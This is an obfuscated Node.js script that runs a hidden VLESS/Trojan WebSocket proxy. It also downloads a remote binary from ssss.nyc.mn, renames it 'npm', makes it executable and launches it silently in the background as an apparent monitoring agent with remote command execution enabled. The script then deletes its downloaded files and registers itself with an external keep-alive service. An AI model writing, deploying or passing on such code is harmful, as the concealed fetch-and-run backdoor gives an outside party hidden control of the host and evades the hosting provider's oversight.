const _0x301f4c=_0x5809;(function(_0x2bc22f,_0x85f524){const _0x22e48a=_0x5809,_0x359a30=_0x2bc22f();while(!![]){try{const _0x2417b1=-parseInt(_0x22e48a(0x21f))/0x1+-parseInt(_0x22e48a(0x1ec))/0x2+-parseInt(_0x22e48a(0x1dc))/0x3+-parseInt(_0x22e48a(0x1cb))/0x4*(-parseInt(_0x22e48a(0x211))/0x5)+parseInt(_0x22e48a(0x1ff))/0x6*(parseInt(_0x22e48a(0x1d9))/0x7)+-parseInt(_0x22e48a(0x226))/0x8+parseInt(_0x22e48a(0x1d5))/0x9;if(_0x2417b1===_0x85f524)break;else _0x359a30['push'](_0x359a30['shift']());}catch(_0x221a79){_0x359a30['push'](_0x359a30['shift']());}}}(_0x21ee,0x70b00));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x301f4c(0x1be)),path=require(_0x301f4c(0x1fa)),crypto=require(_0x301f4c(0x1bf)),{Buffer}=require(_0x301f4c(0x21c)),{exec,execSync}=require(_0x301f4c(0x1c7)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x301f4c(0x209)][_0x301f4c(0x1fc)]||_0x301f4c(0x22a),NEZHA_SERVER=process['env'][_0x301f4c(0x207)]||'',NEZHA_PORT=process[_0x301f4c(0x209)][_0x301f4c(0x1dd)]||'',NEZHA_KEY=process[_0x301f4c(0x209)][_0x301f4c(0x1b3)]||'',DOMAIN=process[_0x301f4c(0x209)][_0x301f4c(0x225)]||_0x301f4c(0x1cd),AUTO_ACCESS=process[_0x301f4c(0x209)]['AUTO_ACCESS']||![],WSPATH=process[_0x301f4c(0x209)][_0x301f4c(0x21e)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x301f4c(0x209)][_0x301f4c(0x1f0)]||'sub',NAME=process[_0x301f4c(0x209)][_0x301f4c(0x1e8)]||'',PORT=process[_0x301f4c(0x209)][_0x301f4c(0x222)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x5ee980=_0x301f4c;try{const _0x598716=await axios[_0x5ee980(0x208)]('https://speed.cloudflare.com/meta'),_0x4c41e8=_0x598716[_0x5ee980(0x1c2)];ISP=(_0x4c41e8[_0x5ee980(0x1c9)]+'-'+_0x4c41e8[_0x5ee980(0x224)])[_0x5ee980(0x1de)](/ /g,'_');}catch(_0x5b7af1){ISP=_0x5ee980(0x1db);}};GetISP();const httpServer=http[_0x301f4c(0x1c5)]((_0x1ccd23,_0x4271a8)=>{const _0x192c97=_0x301f4c;if(_0x1ccd23[_0x192c97(0x1cf)]==='/'){const _0xee7dd2=path[_0x192c97(0x206)](__dirname,'index.html');fs['readFile'](_0xee7dd2,_0x192c97(0x1eb),(_0x1feeb8,_0x230610)=>{const _0x46cb6d=_0x192c97;if(_0x1feeb8){_0x4271a8[_0x46cb6d(0x210)](0xc8,{'Content-Type':_0x46cb6d(0x1f7)}),_0x4271a8[_0x46cb6d(0x1b8)](_0x46cb6d(0x221));return;}_0x4271a8[_0x46cb6d(0x210)](0xc8,{'Content-Type':_0x46cb6d(0x1f7)}),_0x4271a8[_0x46cb6d(0x1b8)](_0x230610);});return;}else{if(_0x1ccd23[_0x192c97(0x1cf)]==='/'+SUB_PATH){const _0x4886b3=NAME?NAME+'-'+ISP:ISP,_0x53dabe=_0x192c97(0x214)+UUID+_0x192c97(0x1bc)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x4886b3,_0x97b8a8=_0x192c97(0x202)+UUID+_0x192c97(0x1b9)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x192c97(0x218)+WSPATH+'#'+_0x4886b3,_0x374081=_0x53dabe+'\x0a'+_0x97b8a8,_0x2d22e2=Buffer[_0x192c97(0x1b4)](_0x374081)['toString'](_0x192c97(0x229));_0x4271a8['writeHead'](0xc8,{'Content-Type':_0x192c97(0x1e3)}),_0x4271a8[_0x192c97(0x1b8)](_0x2d22e2+'\x0a');}else _0x4271a8[_0x192c97(0x210)](0x194,{'Content-Type':_0x192c97(0x1e3)}),_0x4271a8['end'](_0x192c97(0x21a));}}),wss=new WebSocket[(_0x301f4c(0x1d6))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x301f4c(0x20f),_0x301f4c(0x1d2)];function resolveHost(_0x11fce3){return new Promise((_0x3e2000,_0x3dd2c5)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x11fce3)){_0x3e2000(_0x11fce3);return;}let _0x27514c=0x0;function _0x135abf(){const _0x25a3cb=_0x5809;if(_0x27514c>=DNS_SERVERS[_0x25a3cb(0x1c0)]){_0x3dd2c5(new Error(_0x25a3cb(0x1e5)+_0x11fce3+_0x25a3cb(0x20a)));return;}const _0x27d015=DNS_SERVERS[_0x27514c];_0x27514c++;const _0x16ae01=_0x25a3cb(0x1f3)+encodeURIComponent(_0x11fce3)+_0x25a3cb(0x203);axios[_0x25a3cb(0x208)](_0x16ae01,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x25a3cb(0x1ce)](_0x300700=>{const _0x1fbfd2=_0x25a3cb,_0x279237=_0x300700[_0x1fbfd2(0x1c2)];if(_0x279237[_0x1fbfd2(0x1f5)]===0x0&&_0x279237[_0x1fbfd2(0x1f2)]&&_0x279237[_0x1fbfd2(0x1f2)][_0x1fbfd2(0x1c0)]>0x0){const _0x180e00=_0x279237['Answer'][_0x1fbfd2(0x20c)](_0x10bc3e=>_0x10bc3e[_0x1fbfd2(0x20e)]===0x1);if(_0x180e00){_0x3e2000(_0x180e00[_0x1fbfd2(0x1c2)]);return;}}_0x135abf();})['catch'](_0x4ac0f0=>{_0x135abf();});}_0x135abf();});}function handleVlessConnection(_0x3574f6,_0xb4a79d){const _0x7b8fe9=_0x301f4c,[_0xb1a5b8]=_0xb4a79d,_0x57b92c=_0xb4a79d[_0x7b8fe9(0x1e1)](0x1,0x11);if(!_0x57b92c[_0x7b8fe9(0x1d0)]((_0x52a5ec,_0x4bb02d)=>_0x52a5ec==parseInt(uuid[_0x7b8fe9(0x1ba)](_0x4bb02d*0x2,0x2),0x10)))return![];let _0x2541d5=_0xb4a79d[_0x7b8fe9(0x1e1)](0x11,0x12)[_0x7b8fe9(0x21b)]()+0x13;const _0x5884aa=_0xb4a79d[_0x7b8fe9(0x1e1)](_0x2541d5,_0x2541d5+=0x2)[_0x7b8fe9(0x1f9)](0x0),_0x1cfb4f=_0xb4a79d['slice'](_0x2541d5,_0x2541d5+=0x1)[_0x7b8fe9(0x21b)](),_0x41aeb4=_0x1cfb4f==0x1?_0xb4a79d[_0x7b8fe9(0x1e1)](_0x2541d5,_0x2541d5+=0x4)[_0x7b8fe9(0x206)]('.'):_0x1cfb4f==0x2?new TextDecoder()['decode'](_0xb4a79d[_0x7b8fe9(0x1e1)](_0x2541d5+0x1,_0x2541d5+=0x1+_0xb4a79d[_0x7b8fe9(0x1e1)](_0x2541d5,_0x2541d5+0x1)[_0x7b8fe9(0x21b)]())):_0x1cfb4f==0x3?_0xb4a79d[_0x7b8fe9(0x1e1)](_0x2541d5,_0x2541d5+=0x10)[_0x7b8fe9(0x223)]((_0x2728a5,_0x50660e,_0x56da8e,_0x15e401)=>_0x56da8e%0x2?_0x2728a5[_0x7b8fe9(0x216)](_0x15e401[_0x7b8fe9(0x1e1)](_0x56da8e-0x1,_0x56da8e+0x1)):_0x2728a5,[])[_0x7b8fe9(0x1fd)](_0x2cab40=>_0x2cab40[_0x7b8fe9(0x1f9)](0x0)[_0x7b8fe9(0x1da)](0x10))[_0x7b8fe9(0x206)](':'):'';_0x3574f6[_0x7b8fe9(0x1d1)](new Uint8Array([_0xb1a5b8,0x0]));const _0x3c1faa=createWebSocketStream(_0x3574f6);return resolveHost(_0x41aeb4)['then'](_0x22cfae=>{const _0x5a5771=_0x7b8fe9;net[_0x5a5771(0x219)]({'host':_0x22cfae,'port':_0x5884aa},function(){const _0x193284=_0x5a5771;this[_0x193284(0x1ca)](_0xb4a79d['slice'](_0x2541d5)),_0x3c1faa['on']('error',()=>{})['pipe'](this)['on'](_0x193284(0x1d3),()=>{})[_0x193284(0x212)](_0x3c1faa);})['on']('error',()=>{});})[_0x7b8fe9(0x1d8)](_0x5e4d26=>{const _0x3213c2=_0x7b8fe9;net[_0x3213c2(0x219)]({'host':_0x41aeb4,'port':_0x5884aa},function(){const _0x569bfb=_0x3213c2;this[_0x569bfb(0x1ca)](_0xb4a79d['slice'](_0x2541d5)),_0x3c1faa['on']('error',()=>{})[_0x569bfb(0x212)](this)['on'](_0x569bfb(0x1d3),()=>{})[_0x569bfb(0x212)](_0x3c1faa);})['on']('error',()=>{});}),!![];}function _0x5809(_0x51a37a,_0x1f9d49){const _0x21ee00=_0x21ee();return _0x5809=function(_0x5809cf,_0x4e8825){_0x5809cf=_0x5809cf-0x1b1;let _0x1bf650=_0x21ee00[_0x5809cf];return _0x1bf650;},_0x5809(_0x51a37a,_0x1f9d49);}function handleTrojanConnection(_0x4f8dd1,_0x5e48e1){const _0x385aa2=_0x301f4c;try{if(_0x5e48e1[_0x385aa2(0x1c0)]<0x3a)return![];const _0xdda2c7=_0x5e48e1[_0x385aa2(0x1e1)](0x0,0x38)[_0x385aa2(0x1da)](),_0x159a07=[UUID];let _0x573cbd=null;for(const _0x511bf0 of _0x159a07){const _0x494d48=crypto['createHash'](_0x385aa2(0x1f4))[_0x385aa2(0x1b1)](_0x511bf0)[_0x385aa2(0x1ed)](_0x385aa2(0x1c1));if(_0x494d48===_0xdda2c7){_0x573cbd=_0x511bf0;break;}}if(!_0x573cbd)return![];let _0x2fc757=0x38;_0x5e48e1[_0x2fc757]===0xd&&_0x5e48e1[_0x2fc757+0x1]===0xa&&(_0x2fc757+=0x2);const _0x43cb1f=_0x5e48e1[_0x2fc757];if(_0x43cb1f!==0x1)return![];_0x2fc757+=0x1;const _0x7f71fa=_0x5e48e1[_0x2fc757];_0x2fc757+=0x1;let _0x298aba,_0x15f437;if(_0x7f71fa===0x1)_0x298aba=_0x5e48e1['slice'](_0x2fc757,_0x2fc757+0x4)[_0x385aa2(0x206)]('.'),_0x2fc757+=0x4;else{if(_0x7f71fa===0x3){const _0x229e63=_0x5e48e1[_0x2fc757];_0x2fc757+=0x1,_0x298aba=_0x5e48e1['slice'](_0x2fc757,_0x2fc757+_0x229e63)['toString'](),_0x2fc757+=_0x229e63;}else{if(_0x7f71fa===0x4)_0x298aba=_0x5e48e1[_0x385aa2(0x1e1)](_0x2fc757,_0x2fc757+0x10)[_0x385aa2(0x223)]((_0x2c12c2,_0x43c125,_0x4cab3d,_0x672171)=>_0x4cab3d%0x2?_0x2c12c2['concat'](_0x672171[_0x385aa2(0x1e1)](_0x4cab3d-0x1,_0x4cab3d+0x1)):_0x2c12c2,[])[_0x385aa2(0x1fd)](_0x5119b0=>_0x5119b0[_0x385aa2(0x1f9)](0x0)[_0x385aa2(0x1da)](0x10))[_0x385aa2(0x206)](':'),_0x2fc757+=0x10;else return![];}}_0x15f437=_0x5e48e1[_0x385aa2(0x1f9)](_0x2fc757),_0x2fc757+=0x2;_0x2fc757<_0x5e48e1[_0x385aa2(0x1c0)]&&_0x5e48e1[_0x2fc757]===0xd&&_0x5e48e1[_0x2fc757+0x1]===0xa&&(_0x2fc757+=0x2);const _0x371945=createWebSocketStream(_0x4f8dd1);return resolveHost(_0x298aba)['then'](_0x5e9558=>{const _0x512ad7=_0x385aa2;net[_0x512ad7(0x219)]({'host':_0x5e9558,'port':_0x15f437},function(){const _0x52ba30=_0x512ad7;_0x2fc757<_0x5e48e1['length']&&this[_0x52ba30(0x1ca)](_0x5e48e1['slice'](_0x2fc757)),_0x371945['on'](_0x52ba30(0x1d3),()=>{})[_0x52ba30(0x212)](this)['on']('error',()=>{})[_0x52ba30(0x212)](_0x371945);})['on'](_0x512ad7(0x1d3),()=>{});})[_0x385aa2(0x1d8)](_0xb1db24=>{const _0x56063a=_0x385aa2;net[_0x56063a(0x219)]({'host':_0x298aba,'port':_0x15f437},function(){const _0x334df0=_0x56063a;_0x2fc757<_0x5e48e1['length']&&this[_0x334df0(0x1ca)](_0x5e48e1['slice'](_0x2fc757)),_0x371945['on'](_0x334df0(0x1d3),()=>{})[_0x334df0(0x212)](this)['on'](_0x334df0(0x1d3),()=>{})[_0x334df0(0x212)](_0x371945);})['on']('error',()=>{});}),!![];}catch(_0x19b9e6){return![];}}function _0x21ee(){const _0x48d431=['551998zUCyAE','digest','client_secret:\x20','config.yaml','SUB_PATH','npm\x20is\x20running','Answer','https://dns.google/resolve?name=','sha224','Status','Automatic\x20Access\x20Task\x20added\x20successfully','text/html','https://oooo.serv00.net/add-url','readUInt16BE','path','createWriteStream','UUID','map','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','254532UKegBb','trim','https://arm64.ssss.nyc.mn/agent','trojan://','&type=A','https://arm64.ssss.nyc.mn/v1','true','join','NEZHA_SERVER','get','env','\x20with\x20all\x20DNS\x20servers','aarch64','find','npm\x20running\x20error:','type','8.8.4.4','writeHead','5vrnswd','pipe','setsid\x20nohup\x20./npm\x20-s\x20','vless://','unlink','concat','error:\x20','&path=%2F','connect','Not\x20Found\x0a','readUInt8','buffer','chmod\x20+x\x20npm','WSPATH','147442snTBHU','/bin/bash','Hello\x20world!','PORT','reduce','asOrganization','DOMAIN','7050152YraIkc','arm64','close','base64','7fc46fe4-c1c2-11f0-8de9-0242ac120002','--tls','update','2087','NEZHA_KEY','from','post','stream','npm\x20is\x20already\x20running,\x20skip\x20running...','end','@cdns.doon.eu.org:443?security=tls&sni=','substr','log','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','Server\x20is\x20running\x20on\x20port\x20','net','crypto','length','hex','data','connection','8443','createServer','application/json','child_process','https://','country','write','1565348pDnBrw','2083','cdn-103101-pretent.b8trsljkw7.online','then','url','every','send','1.1.1.1','error','2053','8820198xIRJAr','Server','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','catch','91YOzDNg','toString','Unknown','469701ccZFJg','NEZHA_PORT','replace','false','npm','slice','message','text/plain','https://amd64.ssss.nyc.mn/agent','Failed\x20to\x20resolve\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NAME','\x20-p\x20','includes','utf8'];_0x21ee=function(){return _0x48d431;};return _0x21ee();}wss['on'](_0x301f4c(0x1c3),(_0x800fc7,_0x3fd5aa)=>{const _0x4ecc3d=_0x301f4c,_0x1d0f91=_0x3fd5aa[_0x4ecc3d(0x1cf)]||'';_0x800fc7['once'](_0x4ecc3d(0x1e2),_0x1484c8=>{const _0x46aee9=_0x4ecc3d;if(_0x1484c8['length']>0x11&&_0x1484c8[0x0]===0x0){const _0x4919a6=_0x1484c8[_0x46aee9(0x1e1)](0x1,0x11),_0x304532=_0x4919a6[_0x46aee9(0x1d0)]((_0x4cd94e,_0x4430d3)=>_0x4cd94e==parseInt(uuid['substr'](_0x4430d3*0x2,0x2),0x10));if(_0x304532){!handleVlessConnection(_0x800fc7,_0x1484c8)&&_0x800fc7[_0x46aee9(0x228)]();return;}}!handleTrojanConnection(_0x800fc7,_0x1484c8)&&_0x800fc7[_0x46aee9(0x228)]();})['on'](_0x4ecc3d(0x1d3),()=>{});});const getDownloadUrl=()=>{const _0xae003d=_0x301f4c,_0xfb255f=os['arch']();return _0xfb255f==='arm'||_0xfb255f===_0xae003d(0x227)||_0xfb255f===_0xae003d(0x20b)?!NEZHA_PORT?_0xae003d(0x204):_0xae003d(0x201):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0xae003d(0x1e4);},downloadFile=async()=>{const _0x199be9=_0x301f4c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5b52a8=getDownloadUrl(),_0x4870ac=await axios({'method':'get','url':_0x5b52a8,'responseType':_0x199be9(0x1b6)}),_0x285151=fs[_0x199be9(0x1fb)](_0x199be9(0x1e0));return _0x4870ac[_0x199be9(0x1c2)][_0x199be9(0x212)](_0x285151),new Promise((_0x57f298,_0x25899f)=>{const _0x2cf63e=_0x199be9;_0x285151['on']('finish',()=>{const _0x52f6c9=_0x5809;console[_0x52f6c9(0x1bb)]('npm\x20download\x20successfully'),exec(_0x52f6c9(0x21d),_0x1dc40e=>{if(_0x1dc40e)_0x25899f(_0x1dc40e);_0x57f298();});}),_0x285151['on'](_0x2cf63e(0x1d3),_0x25899f);});}catch(_0x1337c9){throw _0x1337c9;}},runnz=async()=>{const _0x1f506d=_0x301f4c;try{const _0x31660=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x31660[_0x1f506d(0x200)]()!==''){console[_0x1f506d(0x1bb)](_0x1f506d(0x1b7));return;}}catch(_0x5455bc){}await downloadFile();let _0x854073='',_0x1a81ed=['443',_0x1f506d(0x1c4),'2096',_0x1f506d(0x1b2),_0x1f506d(0x1cc),_0x1f506d(0x1d4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5ecadf=_0x1a81ed[_0x1f506d(0x1ea)](NEZHA_PORT)?_0x1f506d(0x22b):'';_0x854073=_0x1f506d(0x213)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1f506d(0x1e9)+NEZHA_KEY+'\x20'+_0x5ecadf+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1fd5d3=NEZHA_SERVER[_0x1f506d(0x1ea)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x20a14a=_0x1a81ed[_0x1f506d(0x1ea)](_0x1fd5d3)?_0x1f506d(0x205):_0x1f506d(0x1df),_0x5bd355=_0x1f506d(0x1ee)+NEZHA_KEY+_0x1f506d(0x1e6)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x20a14a+_0x1f506d(0x1d7)+UUID;fs['writeFileSync']('config.yaml',_0x5bd355);}_0x854073=_0x1f506d(0x1e7);}else{console[_0x1f506d(0x1bb)](_0x1f506d(0x1fe));return;}}try{exec(_0x854073,{'shell':_0x1f506d(0x220)},_0x39aeae=>{const _0x53d57e=_0x1f506d;if(_0x39aeae)console[_0x53d57e(0x1d3)](_0x53d57e(0x20d),_0x39aeae);else console[_0x53d57e(0x1bb)](_0x53d57e(0x1f1));});}catch(_0x8339a9){console[_0x1f506d(0x1d3)](_0x1f506d(0x217)+_0x8339a9);}};async function addAccessTask(){const _0x1993db=_0x301f4c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x58b6de=_0x1993db(0x1c8)+DOMAIN+'/'+SUB_PATH;try{const _0x35e9bc=await axios[_0x1993db(0x1b5)](_0x1993db(0x1f8),{'url':_0x58b6de},{'headers':{'Content-Type':_0x1993db(0x1c6)}});console['log'](_0x1993db(0x1f6));}catch(_0x48d1e2){}}const delFiles=()=>{const _0x2627aa=_0x301f4c;fs[_0x2627aa(0x215)](_0x2627aa(0x1e0),()=>{}),fs[_0x2627aa(0x215)](_0x2627aa(0x1ef),()=>{});};httpServer['listen'](PORT,()=>{const _0x18d44a=_0x301f4c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x18d44a(0x1bd)+PORT);});
